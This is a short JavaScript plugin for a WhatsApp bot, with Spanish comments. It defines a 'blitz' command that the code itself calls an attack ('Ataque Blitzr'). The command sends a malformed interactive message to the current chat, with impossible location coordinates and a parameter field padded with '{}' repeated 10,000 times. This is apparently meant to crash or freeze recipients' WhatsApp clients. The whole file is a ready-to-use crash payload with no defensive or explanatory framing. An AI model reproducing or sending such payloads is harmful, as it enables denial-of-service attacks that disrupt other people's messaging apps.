let handler = async (m, { conn }) => {
    const ownerNumber = '527447800928@s.whatsapp.net';
    const botNumber = conn.user?.jid || '';
    const sender = m.sender;

    // Solo permite al owner o al propio bot
    if (sender !== ownerNumber && sender !== botNumber) {
        return conn.reply(m.chat, '👑 Este comando solo está disponible para el owner y el número del bot.', m);
    }

    // Ejecuta el ataque Blitzr en el chat actual (grupo o privado)
    await BlitzrForce(m.chat, conn);

    await conn.sendMessage(m.chat, { text: `⚡ Ataque Blitzr ejecutado.` }, { quoted: m });
};

// Función Blitzr adaptada
async function BlitzrForce(target, sock) {
    try {
        let message = {
            ephemeralMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "© KayzX",
                            hasMediaAttachment: false,
                            locationMessage: {
                                degreesLatitude: -999.0349999999999,
                                degreesLongitude: 922.999999999999,
                                name: "© KayzX",
                                address: "© KayzX",
                            },
                        },
                        body: {
                            text: "© KayzX",
                        },
                        nativeFlowMessage: {
                            messageParamsJson: "{}".repeat(10000),
                        },
                        contextInfo: {
                            participant: "0@s.whatsapp.net",
                            mentionedJid: ["0@s.whatsapp.net"],
                        },
                    },
                },
            },
        };

        await sock.relayMessage(target, message, {
            messageId: null,
            participant: { jid: target },
            userJid: target,
        });
    } catch (err) {
        console.error(err);
    }
}

handler.command = ['blitz'];
handler.tags = ['fake', 'grupo', 'privado'];
handler.help = ['blitz'];

export default handler;